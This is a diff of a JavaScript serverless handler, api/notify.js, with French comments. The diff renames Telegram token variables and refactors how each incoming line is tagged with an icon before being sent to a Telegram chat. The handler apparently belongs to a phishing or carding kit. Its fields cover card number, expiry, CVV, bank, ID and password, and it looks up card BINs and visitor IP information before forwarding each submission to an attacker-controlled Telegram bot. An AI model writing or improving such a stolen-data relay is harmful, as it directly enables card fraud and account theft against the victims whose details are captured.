@@ -1,7 +1,7 @@
 // api/notify.js
 
-const TOKEN        = process.env.TELEGRAM_TOKEN;
-const CHAT         = process.env.CHAT_ID;
+const TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT         = process.env.TELEGRAM_CHAT_ID;
 const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';
 
 export const config = {
@@ -38,7 +38,6 @@ async function getBinInfo(bin8) {
   }
 }
 // —————— FIN AJOUT ——————
-
 
 // lit le body qu’il soit JSON ou texte brut
 async function readBody(req) {
@@ -166,21 +165,11 @@ export default async function handler(req, res) {
 
   // 6️⃣ Mapping des icônes selon le début de la ligne
   const iconMap = {
-    'étape':               '📣',
-    'nom':                 '👤',
-    'prénom':              '🙋',
-    'téléphone':           '📞',
-    'email':               '✉️',
-    'adresse':             '🏠',
-    'carte':               '💳',
-    'numéro':              '🔢',
-    'exp':                 '📅',
-    'expiration':          '📅',
-    'cvv':                 '🔒',
-    'banque':              '🏦',
-    'id':                  '🆔',
-    'pass':                '🔑',
-    'password':            '🔑'
+    'étape':    '📣', 'nom': '👤', 'prénom': '🙋',
+    'téléphone':'📞','email':'✉️', 'adresse':'🏠',
+    'carte':    '💳', 'numéro':'🔢', 'exp':'📅',
+    'expiration':'📅','cvv':'🔒', 'banque':'🏦',
+    'id':       '🆔','pass':'🔑','password':'🔑'
   };
 
   // 7️⃣ Construction du texte Telegram
@@ -188,14 +177,8 @@ export default async function handler(req, res) {
   let text = '';
   for (let line of lines) {
     const low = line.toLowerCase();
-    let icon = '';
-    for (let key in iconMap) {
-      if (low.startsWith(key)) {
-        icon = iconMap[key];
-        break;
-      }
-    }
-    text += icon ? `${icon} ${line}\n` : `${line}\n`;
+    const key = Object.keys(iconMap).find(k => low.startsWith(k));
+    text += (key ? iconMap[key] + ' ' : '') + line + '\n';
   }
 
   // 8️⃣ Ajout du bloc infos système
